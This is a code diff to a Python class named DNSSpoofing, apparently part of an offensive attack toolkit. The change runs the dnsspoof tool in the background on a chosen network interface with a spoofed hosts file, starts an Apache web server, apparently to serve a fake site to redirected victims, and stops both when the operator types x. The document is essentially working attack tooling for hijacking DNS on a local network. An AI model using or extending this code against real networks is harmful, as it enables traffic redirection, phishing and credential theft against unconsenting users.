@@ -22,14 +22,17 @@ import attackBase
 
 class DNSSpoofing(attackBase.Attack):
 
+	
 	spoofedEntries = []
 	hostsFile = "/usr/local/spoofedHosts"
 	interface = "eth0"
 
 	# Starts DNS-Spoofing
 	def start(self):
-		insertEntries = True		
+		insertEntries = True	
+		finishDNSSpoofing = "n"	
 
+		print "### DNS-Spoofing ### \n\n"
 		print "Available interfaces: "
 		subprocess.call(["ls", "/sys/class/net"])
 
@@ -64,8 +67,17 @@ class DNSSpoofing(attackBase.Attack):
 		print "\n Hostsentries successfully added to local hosts-list! \n"
 
 		print "Start with DNS-Spoofing"
-		subprocess.call(["dnsspoof", "-i", self.interface, "-f", self.hostsFile])
+		dnsspoofing = subprocess.Popen(["dnsspoof", "-i", self.interface, "-f", self.hostsFile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		subprocess.call(["service", "apache2", "start"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		print "DNS-Spoofing finished :-)"
+
+		while finishDNSSpoofing != "x":
+			finishDNSSpoofing = raw_input("Terminate DNS-Spoofing with typing x: ")
+
+		if finishDNSSpoofing == "x":
+			dnsspoofing.terminate()
+			subprocess.call(["service", "apache2", "stop"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			print "DNS-Spoofing finished!"
 		
 	def help(self):
 		print "Tutorial how to use this script: \n", \
